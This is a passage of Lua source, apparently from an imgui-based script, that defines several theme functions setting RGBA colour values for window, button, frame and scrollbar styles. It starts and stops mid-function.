	Colors[imgui.Col.ComboBg] = ImVec4(0.19, 0.18, 0.21, 1.00)
	Colors[imgui.Col.CheckMark] = ImVec4(0.80, 0.80, 0.83, 0.31)
	Colors[imgui.Col.SliderGrab] = ImVec4(0.80, 0.80, 0.83, 0.31)
	Colors[imgui.Col.SliderGrabActive] = ImVec4(0.06, 0.05, 0.07, 1.00)
	Colors[imgui.Col.Button] = ImVec4(0.10, 0.09, 0.12, 1.00)
	Colors[imgui.Col.ButtonHovered] = ImVec4(0.24, 0.23, 0.29, 1.00)
	Colors[imgui.Col.ButtonActive] = ImVec4(0.56, 0.56, 0.58, 1.00)
	Colors[imgui.Col.Header] = ImVec4(0.10, 0.09, 0.12, 1.00)
	Colors[imgui.Col.HeaderHovered] = ImVec4(0.56, 0.56, 0.58, 1.00)
	Colors[imgui.Col.HeaderActive] = ImVec4(0.06, 0.05, 0.07, 1.00)
	Colors[imgui.Col.ResizeGrip] = ImVec4(0.00, 0.00, 0.00, 0.00)
	Colors[imgui.Col.ResizeGripHovered] = ImVec4(0.56, 0.56, 0.58, 1.00)
	Colors[imgui.Col.ResizeGripActive] = ImVec4(0.06, 0.05, 0.07, 1.00)
	Colors[imgui.Col.CloseButton] = ImVec4(0.40, 0.39, 0.38, 0.16)
	Colors[imgui.Col.CloseButtonHovered] = ImVec4(0.40, 0.39, 0.38, 0.39)
	Colors[imgui.Col.CloseButtonActive] = ImVec4(0.40, 0.39, 0.38, 1.00)
	Colors[imgui.Col.PlotLines] = ImVec4(0.40, 0.39, 0.38, 0.63)
	Colors[imgui.Col.PlotLinesHovered] = ImVec4(0.25, 1.00, 0.00, 1.00)
	Colors[imgui.Col.PlotHistogram] = ImVec4(0.40, 0.39, 0.38, 0.63)
	Colors[imgui.Col.PlotHistogramHovered] = ImVec4(0.25, 1.00, 0.00, 1.00)
	Colors[imgui.Col.TextSelectedBg] = ImVec4(0.25, 1.00, 0.00, 0.43)
	Colors[imgui.Col.ModalWindowDarkening] = ImVec4(1.00, 0.98, 0.95, 0.73)
end

function theme2()
	local style = imgui.GetStyle()
	local colors = style.Colors
	local clr = imgui.Col
	local ImVec4 = imgui.ImVec4
	colors[clr.FrameBg]                = ImVec4(0.16, 0.29, 0.48, 0.54)
	colors[clr.FrameBgHovered]         = ImVec4(0.26, 0.59, 0.98, 0.40)
	colors[clr.FrameBgActive]          = ImVec4(0.26, 0.59, 0.98, 0.67)
	colors[clr.TitleBg]                = ImVec4(0.04, 0.04, 0.04, 1.00)
	colors[clr.TitleBgActive]          = ImVec4(0.16, 0.29, 0.48, 1.00)
	colors[clr.TitleBgCollapsed]       = ImVec4(0.00, 0.00, 0.00, 0.51)
	colors[clr.CheckMark]              = ImVec4(0.26, 0.59, 0.98, 1.00)
	colors[clr.SliderGrab]             = ImVec4(0.24, 0.52, 0.88, 1.00)
	colors[clr.SliderGrabActive]       = ImVec4(0.26, 0.59, 0.98, 1.00)
	colors[clr.Button]                 = ImVec4(0.26, 0.59, 0.98, 0.40)
	colors[clr.ButtonHovered]          = ImVec4(0.26, 0.59, 0.98, 1.00)
	colors[clr.ButtonActive]           = ImVec4(0.06, 0.53, 0.98, 1.00)
	colors[clr.Header]                 = ImVec4(0.26, 0.59, 0.98, 0.31)
	colors[clr.HeaderHovered]          = ImVec4(0.26, 0.59, 0.98, 0.80)
	colors[clr.HeaderActive]           = ImVec4(0.26, 0.59, 0.98, 1.00)
	colors[clr.Separator]              = colors[clr.Border]
	colors[clr.SeparatorHovered]       = ImVec4(0.26, 0.59, 0.98, 0.78)
	colors[clr.SeparatorActive]        = ImVec4(0.26, 0.59, 0.98, 1.00)
	colors[clr.ResizeGrip]             = ImVec4(0.26, 0.59, 0.98, 0.25)
	colors[clr.ResizeGripHovered]      = ImVec4(0.26, 0.59, 0.98, 0.67)
	colors[clr.ResizeGripActive]       = ImVec4(0.26, 0.59, 0.98, 0.95)
	colors[clr.TextSelectedBg]         = ImVec4(0.26, 0.59, 0.98, 0.35)
	colors[clr.Text]                   = ImVec4(1.00, 1.00, 1.00, 1.00)
	colors[clr.TextDisabled]           = ImVec4(0.50, 0.50, 0.50, 1.00)
	colors[clr.WindowBg]               = ImVec4(0.06, 0.06, 0.06, 0.94)
	colors[clr.ChildWindowBg]          = ImVec4(1.00, 1.00, 1.00, 0.00)
	colors[clr.PopupBg]                = ImVec4(0.08, 0.08, 0.08, 0.94)
	colors[clr.ComboBg]                = colors[clr.PopupBg]
	colors[clr.Border]                 = ImVec4(0.43, 0.43, 0.50, 0.50)
	colors[clr.BorderShadow]           = ImVec4(0.00, 0.00, 0.00, 0.00)
	colors[clr.MenuBarBg]              = ImVec4(0.14, 0.14, 0.14, 1.00)
	colors[clr.ScrollbarBg]            = ImVec4(0.02, 0.02, 0.02, 0.53)
	colors[clr.ScrollbarGrab]          = ImVec4(0.31, 0.31, 0.31, 1.00)
	colors[clr.ScrollbarGrabHovered]   = ImVec4(0.41, 0.41, 0.41, 1.00)
	colors[clr.ScrollbarGrabActive]    = ImVec4(0.51, 0.51, 0.51, 1.00)
	colors[clr.CloseButton]            = ImVec4(0.41, 0.41, 0.41, 0.50)
	colors[clr.CloseButtonHovered]     = ImVec4(0.98, 0.39, 0.36, 1.00)
	colors[clr.CloseButtonActive]      = ImVec4(0.98, 0.39, 0.36, 1.00)
	colors[clr.PlotLines]              = ImVec4(0.61, 0.61, 0.61, 1.00)
	colors[clr.PlotLinesHovered]       = ImVec4(1.00, 0.43, 0.35, 1.00)
	colors[clr.PlotHistogram]          = ImVec4(0.90, 0.70, 0.00, 1.00)
	colors[clr.PlotHistogramHovered]   = ImVec4(1.00, 0.60, 0.00, 1.00)
	colors[clr.ModalWindowDarkening]   = ImVec4(0.80, 0.80, 0.80, 0.35)
end

function theme3()
	local style = imgui.GetStyle()
	local colors = style.Colors
	local clr = imgui.Col
	local ImVec4 = imgui.ImVec4
	colors[clr.FrameBg]                = ImVec4(0.48, 0.16, 0.16, 0.54)
	colors[clr.FrameBgHovered]         = ImVec4(0.98, 0.26, 0.26, 0.40)
	colors[clr.FrameBgActive]          = ImVec4(0.98, 0.26, 0.26, 0.67)
	colors[clr.TitleBg]                = ImVec4(0.04, 0.04, 0.04, 1.00)
	colors[clr.TitleBgActive]          = ImVec4(0.48, 0.16, 0.16, 1.00)
	colors[clr.TitleBgCollapsed]       = ImVec4(0.00, 0.00, 0.00, 0.51)
	colors[clr.CheckMark]              = ImVec4(0.98, 0.26, 0.26, 1.00)
	colors[clr.SliderGrab]             = ImVec4(0.88, 0.26, 0.24, 1.00)
	colors[clr.SliderGrabActive]       = ImVec4(0.98, 0.26, 0.26, 1.00)
	colors[clr.Button]                 = ImVec4(0.98, 0.26, 0.26, 0.40)
	colors[clr.ButtonHovered]          = ImVec4(0.98, 0.26, 0.26, 1.00)
	colors[clr.ButtonActive]           = ImVec4(0.98, 0.06, 0.06, 1.00)
	colors[clr.Header]                 = ImVec4(0.98, 0.26, 0.26, 0.31)
	colors[clr.HeaderHovered]          = ImVec4(0.98, 0.26, 0.26, 0.80)
	colors[clr.HeaderActive]           = ImVec4(0.98, 0.26, 0.26, 1.00)
	colors[clr.Separator]              = colors[clr.Border]
	colors[clr.SeparatorHovered]       = ImVec4(0.75, 0.10, 0.10, 0.78)
	colors[clr.SeparatorActive]        = ImVec4(0.75, 0.10, 0.10, 1.00)
	colors[clr.ResizeGrip]             = ImVec4(0.98, 0.26, 0.26, 0.25)
	colors[clr.ResizeGripHovered]      = ImVec4(0.98, 0.26, 0.26, 0.67)
	colors[clr.ResizeGripActive]       = ImVec4(0.98, 0.26, 0.26, 0.95)
	colors[clr.TextSelectedBg]         = ImVec4(0.98, 0.26, 0.26, 0.35)
	colors[clr.Text]                   = ImVec4(1.00, 1.00, 1.00, 1.00)
	colors[clr.TextDisabled]           = ImVec4(0.50, 0.50, 0.50, 1.00)
	colors[clr.WindowBg]               = ImVec4(0.06, 0.06, 0.06, 0.94)
	colors[clr.ChildWindowBg]          = ImVec4(1.00, 1.00, 1.00, 0.00)
	colors[clr.PopupBg]                = ImVec4(0.08, 0.08, 0.08, 0.94)
	colors[clr.ComboBg]                = colors[clr.PopupBg]
	colors[clr.Border]                 = ImVec4(0.43, 0.43, 0.50, 0.50)
	colors[clr.BorderShadow]           = ImVec4(0.00, 0.00, 0.00, 0.00)
	colors[clr.MenuBarBg]              = ImVec4(0.14, 0.14, 0.14, 1.00)
	colors[clr.ScrollbarBg]            = ImVec4(0.02, 0.02, 0.02, 0.53)
	colors[clr.ScrollbarGrab]          = ImVec4(0.31, 0.31, 0.31, 1.00)
	colors[clr.ScrollbarGrabHovered]   = ImVec4(0.41, 0.41, 0.41, 1.00)
	colors[clr.ScrollbarGrabActive]    = ImVec4(0.51, 0.51, 0.51, 1.00)
	colors[clr.CloseButton]            = ImVec4(0.41, 0.41, 0.41, 0.50)
	colors[clr.CloseButtonHovered]     = ImVec4(0.98, 0.39, 0.36, 1.00)
	colors[clr.CloseButtonActive]      = ImVec4(0.98, 0.39, 0.36, 1.00)
	colors[clr.PlotLines]              = ImVec4(0.61, 0.61, 0.61, 1.00)
	colors[clr.PlotLinesHovered]       = ImVec4(1.00, 0.43, 0.35, 1.00)
	colors[clr.PlotHistogram]          = ImVec4(0.90, 0.70, 0.00, 1.00)
	colors[clr.PlotHistogramHovered]   = ImVec4(1.00, 0.60, 0.00, 1.00)
	colors[clr.ModalWindowDarkening]   = ImVec4(0.80, 0.80, 0.80, 0.35)
end

function theme4()
	local style = imgui.GetStyle()
	local colors = style.Colors
	local clr = imgui.Col
	local ImVec4 = imgui.ImVec4
	colors[clr.FrameBg]                = ImVec4(0.16, 0.48, 0.42, 0.54)
	colors[clr.FrameBgHovered]         = ImVec4(0.26, 0.98, 0.85, 0.40)
	colors[clr.FrameBgActive]          = ImVec4(0.26, 0.98, 0.85, 0.67)
	colors[clr.TitleBg]                = ImVec4(0.04, 0.04, 0.04, 1.00)
	colors[clr.TitleBgActive]          = ImVec4(0.16, 0.48, 0.42, 1.00)
	colors[clr.TitleBgCollapsed]       = ImVec4(0.00, 0.00, 0.00, 0.51)
	colors[clr.CheckMark]              = ImVec4(0.26, 0.98, 0.85, 1.00)
	colors[clr.SliderGrab]             = ImVec4(0.24, 0.88, 0.77, 1.00)
	colors[clr.SliderGrabActive]       = ImVec4(0.26, 0.98, 0.85, 1.00)
	colors[clr.Button]                 = ImVec4(0.26, 0.98, 0.85, 0.40)
	colors[clr.ButtonHovered]          = ImVec4(0.26, 0.98, 0.85, 1.00)
	colors[clr.ButtonActive]           = ImVec4(0.06, 0.98, 0.82, 1.00)
	colors[clr.Header]                 = ImVec4(0.26, 0.98, 0.85, 0.31)
	colors[clr.HeaderHovered]          = ImVec4(0.26, 0.98, 0.85, 0.80)
	colors[clr.HeaderActive]           = ImVec4(0.26, 0.98, 0.85, 1.00)
	colors[clr.Separator]              = colors[clr.Border]
	colors[clr.SeparatorHovered]       = ImVec4(0.10, 0.75, 0.63, 0.78)
	colors[clr.SeparatorActive]        = ImVec4(0.10, 0.75, 0.63, 1.00)
	colors[clr.ResizeGrip]             = ImVec4(0.26, 0.98, 0.85, 0.25)
	colors[clr.ResizeGripHovered]      = ImVec4(0.26, 0.98, 0.85, 0.67)
	colors[clr.ResizeGripActive]       = ImVec4(0.26, 0.98, 0.85, 0.95)
	colors[clr.PlotLines]              = ImVec4(0.61, 0.61, 0.61, 1.00)
	colors[clr.PlotLinesHovered]       = ImVec4(1.00, 0.81, 0.35, 1.00)
	colors[clr.TextSelectedBg]         = ImVec4(0.26, 0.98, 0.85, 0.35)
	colors[clr.Text]                   = ImVec4(1.00, 1.00, 1.00, 1.00)
	colors[clr.TextDisabled]           = ImVec4(0.50, 0.50, 0.50, 1.00)
	colors[clr.WindowBg]               = ImVec4(0.06, 0.06, 0.06, 0.94)
	colors[clr.ChildWindowBg]          = ImVec4(1.00, 1.00, 1.00, 0.00)
	colors[clr.PopupBg]                = ImVec4(0.08, 0.08, 0.08, 0.94)
	colors[clr.ComboBg]                = colors[clr.PopupBg]
	colors[clr.Border]                 = ImVec4(0.43, 0.43, 0.50, 0.50)
	colors[clr.BorderShadow]           = ImVec4(0.00, 0.00, 0.00, 0.00)
	colors[clr.MenuBarBg]              = ImVec4(0.14, 0.14, 0.14, 1.00)
	colors[clr.ScrollbarBg]            = ImVec4(0.02, 0.02, 0.02, 0.53)
	colors[clr.ScrollbarGrab]          = ImVec4(0.31, 0.31, 0.31, 1.00)
	colors[clr.ScrollbarGrabHovered]   = ImVec4(0.41, 0.41, 0.41, 1.00)
	colors[clr.ScrollbarGrabActive]    = ImVec4(0.51, 0.51, 0.51, 1.00)
	colors[clr.CloseButton]            = ImVec4(0.41, 0.41, 0.41, 0.50)
	colors[clr.CloseButtonHovered]     = ImVec4(0.98, 0.39, 0.36, 1.00)
	colors[clr.CloseButtonActive]      = ImVec4(0.98, 0.39, 0.36, 1.00)
	colors[clr.PlotHistogram]          = ImVec4(0.90, 0.70, 0.00, 1.00)
	colors[clr.PlotHistogramHovered]   = ImVec4(1.00, 0.60, 0.00, 1.00)
	colors[clr.ModalWindowDarkening]   = ImVec4(0.80, 0.80, 0.80, 0.35)
end

function theme5()
	local style = imgui.GetStyle()
	local colors = style.Colors
	local clr = imgui.Col
	local ImVec4 = imgui.ImVec4
	style.WindowTitleAlign = imgui.ImVec2(0.5, 0.84)
	style.Alpha = 1.0
	style.Colors[clr.Text] = ImVec4(1.000, 1.000, 1.000, 1.000)
	style.Colors[clr.TextDisabled] = ImVec4(0.000, 0.543, 0.983, 1.000)
	style.Colors[clr.WindowBg] = ImVec4(0.000, 0.000, 0.000, 0.895)
	style.Colors[clr.ChildWindowBg] = ImVec4(0.00, 0.00, 0.00, 0.00)
	style.Colors[clr.PopupBg] = ImVec4(0.07, 0.07, 0.09, 1.00)
	style.Colors[clr.Border] = ImVec4(0.184, 0.878, 0.000, 0.500)
	style.Colors[clr.BorderShadow] = ImVec4(1.00, 1.00, 1.00, 0.10)
	style.Colors[clr.TitleBg] = ImVec4(0.026, 0.597, 0.000, 1.000)
	style.Colors[clr.TitleBgCollapsed] = ImVec4(0.099, 0.315, 0.000, 0.000)
	style.Colors[clr.TitleBgActive] = ImVec4(0.026, 0.597, 0.000, 1.000)
	style.Colors[clr.MenuBarBg] = ImVec4(0.86, 0.86, 0.86, 1.00)
	style.Colors[clr.ScrollbarBg] = ImVec4(0.000, 0.000, 0.000, 0.801)
	style.Colors[clr.ScrollbarGrab] = ImVec4(0.238, 0.238, 0.238, 1.000)
	style.Colors[clr.ScrollbarGrabHovered] = ImVec4(0.238, 0.238, 0.238, 1.000)
	style.Colors[clr.ScrollbarGrabActive] = ImVec4(0.004, 0.381, 0.000, 1.000)
	style.Colors[clr.CheckMark] = ImVec4(0.009, 0.845, 0.000, 1.000)
	style.Colors[clr.SliderGrab] = ImVec4(0.139, 0.508, 0.000, 1.000)
	style.Colors[clr.SliderGrabActive] = ImVec4(0.139, 0.508, 0.000, 1.000)
	style.Colors[clr.Button] = ImVec4(0.000, 0.000, 0.000, 0.400)
	style.Colors[clr.ButtonHovered] = ImVec4(0.000, 0.619, 0.014, 1.000)
	style.Colors[clr.ButtonActive] = ImVec4(0.06, 0.53, 0.98, 1.00)
	style.Colors[clr.Header] = ImVec4(0.26, 0.59, 0.98, 0.31)
	style.Colors[clr.HeaderHovered] = ImVec4(0.26, 0.59, 0.98, 0.80)
	style.Colors[clr.HeaderActive] = ImVec4(0.26, 0.59, 0.98, 1.00)
	style.Colors[clr.ResizeGrip] = ImVec4(0.000, 1.000, 0.221, 0.597)
	style.Colors[clr.ResizeGripHovered] = ImVec4(0.26, 0.59, 0.98, 0.67)
	style.Colors[clr.ResizeGripActive] = ImVec4(0.26, 0.59, 0.98, 0.95)
	style.Colors[clr.PlotLines] = ImVec4(0.39, 0.39, 0.39, 1.00)
	style.Colors[clr.PlotLinesHovered] = ImVec4(1.00, 0.43, 0.35, 1.00)
	style.Colors[clr.PlotHistogram] = ImVec4(0.90, 0.70, 0.00, 1.00)
	style.Colors[clr.PlotHistogramHovered] = ImVec4(1.00, 0.60, 0.00, 1.00)
	style.Colors[clr.TextSelectedBg] = ImVec4(0.26, 0.59, 0.98, 0.35)
	style.Colors[clr.ModalWindowDarkening] = ImVec4(0.20, 0.20, 0.20, 0.35)

	style.ScrollbarSize = 16.0
	style.GrabMinSize = 8.0
	style.WindowRounding = 0.0

	style.AntiAliasedLines = true
end

function theme6()
	local style = imgui.GetStyle()
	local colors = style.Colors
	local clr = imgui.Col
	local ImVec4 = imgui.ImVec4
	colors[clr.Text] = ImVec4(0.90, 0.90, 0.90, 1.00)
	colors[clr.TextDisabled] = ImVec4(0.24, 0.23, 0.29, 1.00)
	colors[clr.WindowBg] = ImVec4(0.06, 0.05, 0.07, 1.00)
	colors[clr.ChildWindowBg] = ImVec4(0.07, 0.07, 0.09, 1.00)
	colors[clr.PopupBg] = ImVec4(0.07, 0.07, 0.09, 1.00)
	colors[clr.Border] = ImVec4(0.80, 0.80, 0.83, 0.88)
	colors[clr.BorderShadow] = ImVec4(0.92, 0.91, 0.88, 0.00)
	colors[clr.FrameBg] = ImVec4(0.10, 0.09, 0.12, 1.00)
	colors[clr.FrameBgHovered] = ImVec4(0.24, 0.23, 0.29, 1.00)
	colors[clr.FrameBgActive] = ImVec4(0.56, 0.56, 0.58, 1.00)
	colors[clr.TitleBg] = ImVec4(0.76, 0.31, 0.00, 1.00)
	colors[clr.TitleBgCollapsed] = ImVec4(1.00, 0.98, 0.95, 0.75)
	colors[clr.TitleBgActive] = ImVec4(0.80, 0.33, 0.00, 1.00)
	colors[clr.MenuBarBg] = ImVec4(0.10, 0.09, 0.12, 1.00)
	colors[clr.ScrollbarBg] = ImVec4(0.10, 0.09, 0.12, 1.00)
	colors[clr.ScrollbarGrab] = ImVec4(0.80, 0.80, 0.83, 0.31)
	colors[clr.ScrollbarGrabHovered] = ImVec4(0.56, 0.56, 0.58, 1.00)
	colors[clr.ScrollbarGrabActive] = ImVec4(0.06, 0.05, 0.07, 1.00)
	colors[clr.ComboBg] = ImVec4(0.19, 0.18, 0.21, 1.00)
	colors[clr.CheckMark] = ImVec4(1.00, 0.42, 0.00, 0.53)
	colors[clr.SliderGrab] = ImVec4(1.00, 0.42, 0.00, 0.53)
	colors[clr.SliderGrabActive] = ImVec4(1.00, 0.42, 0.00, 1.00)
	colors[clr.Button] = ImVec4(0.10, 0.09, 0.12, 1.00)
	colors[clr.ButtonHovered] = ImVec4(0.24, 0.23, 0.29, 1.00)
	colors[clr.ButtonActive] = ImVec4(0.56, 0.56, 0.58, 1.00)
	colors[clr.Header] = ImVec4(0.10, 0.09, 0.12, 1.00)
	colors[clr.HeaderHovered] = ImVec4(0.56, 0.56, 0.58, 1.00)
	colors[clr.HeaderActive] = ImVec4(0.06, 0.05, 0.07, 1.00)
	colors[clr.ResizeGrip] = ImVec4(0.00, 0.00, 0.00, 0.00)
	colors[clr.ResizeGripHovered] = ImVec4(0.56, 0.56, 0.58, 1.00)
	colors[clr.ResizeGripActive] = ImVec4(0.06, 0.05, 0.07, 1.00)
	colors[clr.CloseButton] = ImVec4(0.40, 0.39, 0.38, 0.16)
	colors[clr.CloseButtonHovered] = ImVec4(0.40, 0.39, 0.38, 0.39)
	colors[clr.CloseButtonActive] = ImVec4(0.40, 0.39, 0.38, 1.00)
	colors[clr.PlotLines] = ImVec4(0.40, 0.39, 0.38, 0.63)
	colors[clr.PlotLinesHovered] = ImVec4(0.25, 1.00, 0.00, 1.00)
	colors[clr.PlotHistogram] = ImVec4(0.40, 0.39, 0.38, 0.63)
	colors[clr.PlotHistogramHovered] = ImVec4(0.25, 1.00, 0.00, 1.00)
	colors[clr.TextSelectedBg] = ImVec4(0.25, 1.00, 0.00, 0.43)
	colors[clr.ModalWindowDarkening] = ImVec4(1.00, 0.98, 0.95, 0.73)
end

function theme7()
	local style = imgui.GetStyle()
	local colors = style.Colors
	local clr = imgui.Col
	local ImVec4 = imgui.ImVec4
	colors[clr.WindowBg]              = ImVec4(0.14, 0.12, 0.16, 1.00);
	colors[clr.ChildWindowBg]         = ImVec4(0.30, 0.20, 0.39, 0.00);
	colors[clr.PopupBg]               = ImVec4(0.05, 0.05, 0.10, 0.90);
	colors[clr.Border]                = ImVec4(0.89, 0.85, 0.92, 0.30);
	colors[clr.BorderShadow]          = ImVec4(0.00, 0.00, 0.00, 0.00);
	colors[clr.FrameBg]               = ImVec4(0.30, 0.20, 0.39, 1.00);
	colors[clr.FrameBgHovered]        = ImVec4(0.41, 0.19, 0.63, 0.68);
	colors[clr.FrameBgActive]         = ImVec4(0.41, 0.19, 0.63, 1.00);
	colors[clr.TitleBg]               = ImVec4(0.41, 0.19, 0.63, 0.45);
	colors[clr.TitleBgCollapsed]      = ImVec4(0.41, 0.19, 0.63, 0.35);
	colors[clr.TitleBgActive]         = ImVec4(0.41, 0.19, 0.63, 0.78);
	colors[clr.MenuBarBg]             = ImVec4(0.30, 0.20, 0.39, 0.57);
	colors[clr.ScrollbarBg]           = ImVec4(0.30, 0.20, 0.39, 1.00);
	colors[clr.ScrollbarGrab]         = ImVec4(0.41, 0.19, 0.63, 0.31);
	colors[clr.ScrollbarGrabHovered]  = ImVec4(0.41, 0.19, 0.63, 0.78);
	colors[clr.ScrollbarGrabActive]   = ImVec4(0.41, 0.19, 0.63, 1.00);
	colors[clr.ComboBg]               = ImVec4(0.30, 0.20, 0.39, 1.00);
	colors[clr.CheckMark]             = ImVec4(0.56, 0.61, 1.00, 1.00);
	colors[clr.SliderGrab]            = ImVec4(0.41, 0.19, 0.63, 0.24);
	colors[clr.SliderGrabActive]      = ImVec4(0.41, 0.19, 0.63, 1.00);
	colors[clr.Button]                = ImVec4(0.41, 0.19, 0.63, 0.44);
	colors[clr.ButtonHovered]         = ImVec4(0.41, 0.19, 0.63, 0.86);
	colors[clr.ButtonActive]          = ImVec4(0.64, 0.33, 0.94, 1.00);
	colors[clr.Header]                = ImVec4(0.41, 0.19, 0.63, 0.76);
	colors[clr.HeaderHovered]         = ImVec4(0.41, 0.19, 0.63, 0.86);
	colors[clr.HeaderActive]          = ImVec4(0.41, 0.19, 0.63, 1.00);
	colors[clr.ResizeGrip]            = ImVec4(0.41, 0.19, 0.63, 0.20);
	colors[clr.ResizeGripHovered]     = ImVec4(0.41, 0.19, 0.63, 0.78);
	colors[clr.ResizeGripActive]      = ImVec4(0.41, 0.19, 0.63, 1.00);
	colors[clr.CloseButton]           = ImVec4(1.00, 1.00, 1.00, 0.75);
	colors[clr.CloseButtonHovered]    = ImVec4(0.88, 0.74, 1.00, 0.59);
	colors[clr.CloseButtonActive]     = ImVec4(0.88, 0.85, 0.92, 1.00);
	colors[clr.PlotLines]             = ImVec4(0.89, 0.85, 0.92, 0.63);
	colors[clr.PlotLinesHovered]      = ImVec4(0.41, 0.19, 0.63, 1.00);
	colors[clr.PlotHistogram]         = ImVec4(0.89, 0.85, 0.92, 0.63);
	colors[clr.PlotHistogramHovered]  = ImVec4(0.41, 0.19, 0.63, 1.00);
	colors[clr.TextSelectedBg]        = ImVec4(0.41, 0.19, 0.63, 0.43);
	colors[clr.ModalWindowDarkening]  = ImVec4(0.20, 0.20, 0.20, 0.35);
end

function theme8()
	local style = imgui.GetStyle()
	local colors = style.Colors
	local clr = imgui.Col
	local ImVec4 = imgui.ImVec4

	colors[clr.Text]                   = ImVec4(0.90, 0.90, 0.90, 1.00)
	colors[clr.TextDisabled]           = ImVec4(1.00, 1.00, 1.00, 1.00)
	colors[clr.WindowBg]               = ImVec4(0.00, 0.00, 0.00, 1.00)
	colors[clr.ChildWindowBg]          = ImVec4(0.00, 0.00, 0.00, 1.00)
	colors[clr.PopupBg]                = ImVec4(0.00, 0.00, 0.00, 1.00)
	colors[clr.Border]                 = ImVec4(0.82, 0.77, 0.78, 1.00)
	colors[clr.BorderShadow]           = ImVec4(0.35, 0.35, 0.35, 0.66)
	colors[clr.FrameBg]                = ImVec4(1.00, 1.00, 1.00, 0.28)
	colors[clr.FrameBgHovered]         = ImVec4(0.68, 0.68, 0.68, 0.67)
	colors[clr.FrameBgActive]          = ImVec4(0.79, 0.73, 0.73, 0.62)
	colors[clr.TitleBg]                = ImVec4(0.00, 0.00, 0.00, 1.00)
	colors[clr.TitleBgActive]          = ImVec4(0.46, 0.46, 0.46, 1.00)
	colors[clr.TitleBgCollapsed]       = ImVec4(0.00, 0.00, 0.00, 1.00)
	colors[clr.MenuBarBg]              = ImVec4(0.00, 0.00, 0.00, 0.80)
	colors[clr.ScrollbarBg]            = ImVec4(0.00, 0.00, 0.00, 0.60)
	colors[clr.ScrollbarGrab]          = ImVec4(1.00, 1.00, 1.00, 0.87)
	colors[clr.ScrollbarGrabHovered]   = ImVec4(1.00, 1.00, 1.00, 0.79)
	colors[clr.ScrollbarGrabActive]    = ImVec4(0.80, 0.50, 0.50, 0.40)
	colors[clr.ComboBg]                = ImVec4(0.24, 0.24, 0.24, 0.99)
	colors[clr.CheckMark]              = ImVec4(0.99, 0.99, 0.99, 0.52)
	colors[clr.SliderGrab]             = ImVec4(1.00, 1.00, 1.00, 0.42)
	colors[clr.SliderGrabActive]       = ImVec4(0.76, 0.76, 0.76, 1.00)
	colors[clr.Button]                 = ImVec4(0.51, 0.51, 0.51, 0.60)
	colors[clr.ButtonHovered]          = ImVec4(0.68, 0.68, 0.68, 1.00)
	colors[clr.ButtonActive]           = ImVec4(0.67, 0.67, 0.67, 1.00)
	colors[clr.Header]                 = ImVec4(0.72, 0.72, 0.72, 0.54)
	colors[clr.HeaderHovered]          = ImVec4(0.92, 0.92, 0.95, 0.77)
	colors[clr.HeaderActive]           = ImVec4(0.82, 0.82, 0.82, 0.80)
	colors[clr.Separator]              = ImVec4(0.73, 0.73, 0.73, 1.00)
	colors[clr.SeparatorHovered]       = ImVec4(0.81, 0.81, 0.81, 1.00)
	colors[clr.SeparatorActive]        = ImVec4(0.74, 0.74, 0.74, 1.00)
	colors[clr.ResizeGrip]             = ImVec4(0.80, 0.80, 0.80, 0.30)
	colors[clr.ResizeGripHovered]      = ImVec4(0.95, 0.95, 0.95, 0.60)
	colors[clr.ResizeGripActive]       = ImVec4(1.00, 1.00, 1.00, 0.90)
	colors[clr.CloseButton]            = ImVec4(0.45, 0.45, 0.45, 0.50)
	colors[clr.CloseButtonHovered]     = ImVec4(0.70, 0.70, 0.90, 0.60)
	colors[clr.CloseButtonActive]      = ImVec4(0.70, 0.70, 0.70, 1.00)
	colors[clr.PlotLines]              = ImVec4(1.00, 1.00, 1.00, 1.00)
	colors[clr.PlotLinesHovered]       = ImVec4(1.00, 1.00, 1.00, 1.00)
	colors[clr.PlotHistogram]          = ImVec4(1.00, 1.00, 1.00, 1.00)
	colors[clr.PlotHistogramHovered]   = ImVec4(1.00, 1.00, 1.00, 1.00)
	colors[clr.TextSelectedBg]         = ImVec4(1.00, 1.00, 1.00, 0.35)
	colors[clr.ModalWindowDarkening]   = ImVec4(0.88, 0.88, 0.88, 0.35)
end

function theme9()
	local style = imgui.GetStyle()
	local colors = style.Colors
	local clr = imgui.Col
	local ImVec4 = imgui.ImVec4
	colors[clr.Text] = ImVec4(1.00, 1.00, 1.00, 1.00)
	colors[clr.TextDisabled] = ImVec4(0.60, 0.60, 0.60, 1.00)
	colors[clr.WindowBg] = ImVec4(0.11, 0.10, 0.11, 1.00)
	colors[clr.ChildWindowBg] = ImVec4(0.00, 0.00, 0.00, 0.00)
	colors[clr.PopupBg] = ImVec4(0.00, 0.00, 0.00, 0.00)
	colors[clr.Border] = ImVec4(0.86, 0.86, 0.86, 1.00)
	colors[clr.BorderShadow] = ImVec4(0.00, 0.00, 0.00, 0.00)
	colors[clr.FrameBg] = ImVec4(0.21, 0.20, 0.21, 0.60)
	colors[clr.FrameBgHovered] = ImVec4(0.00, 0.46, 0.65, 1.00)
	colors[clr.FrameBgActive] = ImVec4(0.00, 0.46, 0.65, 1.00)
	colors[clr.TitleBg] = ImVec4(0.00, 0.46, 0.65, 1.00)
	colors[clr.TitleBgCollapsed] = ImVec4(0.00, 0.46, 0.65, 1.00)
	colors[clr.TitleBgActive] = ImVec4(0.00, 0.46, 0.65, 1.00)
	colors[clr.MenuBarBg] = ImVec4(0.00, 0.46, 0.65, 1.00)
	colors[clr.ScrollbarBg] = ImVec4(0.00, 0.46, 0.65, 0.00)
	colors[clr.ScrollbarGrab] = ImVec4(0.00, 0.46, 0.65, 0.44)
	colors[clr.ScrollbarGrabHovered] = ImVec4(0.00, 0.46, 0.65, 0.74)
	colors[clr.ScrollbarGrabActive] = ImVec4(0.00, 0.46, 0.65, 1.00)
	colors[clr.ComboBg] = ImVec4(0.15, 0.14, 0.15, 1.00)
	colors[clr.CheckMark] = ImVec4(0.00, 0.46, 0.65, 1.00)
	colors[clr.SliderGrab] = ImVec4(0.00, 0.46, 0.65, 1.00)
	colors[clr.SliderGrabActive] = ImVec4(0.00, 0.46, 0.65, 1.00)
	colors[clr.Button] = ImVec4(0.00, 0.46, 0.65, 1.00)
	colors[clr.ButtonHovered] = ImVec4(0.00, 0.46, 0.65, 1.00)
	colors[clr.ButtonActive] = ImVec4(0.00, 0.46, 0.65, 1.00)
	colors[clr.Header] = ImVec4(0.00, 0.46, 0.65, 1.00)
	colors[clr.HeaderHovered] = ImVec4(0.00, 0.46, 0.65, 1.00)
	colors[clr.HeaderActive] = ImVec4(0.00, 0.46, 0.65, 1.00)
	colors[clr.ResizeGrip] = ImVec4(1.00, 1.00, 1.00, 0.30)
	colors[clr.ResizeGripHovered] = ImVec4(1.00, 1.00, 1.00, 0.60)
